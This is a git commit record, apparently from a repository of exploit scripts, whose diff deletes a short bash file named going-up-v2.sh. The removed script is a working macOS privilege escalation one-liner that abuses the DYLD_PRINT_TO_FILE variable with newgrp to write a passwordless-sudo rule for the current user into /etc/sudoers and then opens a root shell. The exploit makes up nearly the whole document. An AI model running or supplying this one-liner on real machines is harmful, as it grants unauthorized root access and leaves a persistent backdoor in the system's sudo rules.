196e9f30ad8bb6ebd98eef2fe3eb2b9c496ce5aa
Rick Heil <rickheil@partnersandsimons.com>
2016-06-27 11:35:26 -0400

    organize

--- going-up-v2.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-# another way abusing the shortest one liner ever
-# this drops you right into a root shell and puts your current user into the sudo group needing no password to execute commands.
-
-echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
-
-exit 0
